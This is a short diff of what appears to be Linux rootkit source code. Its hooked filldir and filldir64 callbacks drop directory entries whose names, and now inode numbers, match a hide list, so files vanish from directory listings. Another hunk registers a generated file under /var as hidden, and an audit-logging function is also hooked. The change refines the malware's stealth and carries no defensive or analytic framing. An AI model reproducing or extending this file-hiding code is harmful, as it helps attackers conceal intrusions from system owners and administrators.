@@ -577,7 +577,7 @@ static struct audit_buffer *m_audit_log_start(struct audit_context *ctx,
 static int  (*real_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
 static int m_filldir(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned int d_type) {
 
-    if (fs_search_name(name))
+    if (fs_search_name(name, ino))
         return 0;
     return real_filldir(ctx, name, namlen, offset, ino, d_type);
 }
@@ -585,7 +585,7 @@ static int m_filldir(struct dir_context *ctx, const char *name, int namlen,loff_
 static int  (*real_filldir64)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
 static int m_filldir64(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned int d_type) {
 
-    if (fs_search_name(name))
+    if (fs_search_name(name, ino))
         return 0;
     return real_filldir64(ctx, name, namlen, offset, ino, d_type);
 }
@@ -1040,7 +1040,7 @@ static char *_sys_file(char *prefix, char *file, int len) {
         snprintf(file, len-1, "/var/%s", s);
         {
             const char *tmp[] = {s,NULL};
-            fs_add_name_ro(tmp);
+            fs_add_name_ro(tmp, 0);
         }
         prinfo("new %s, filename: '%s'\n", prefix, file);
     }
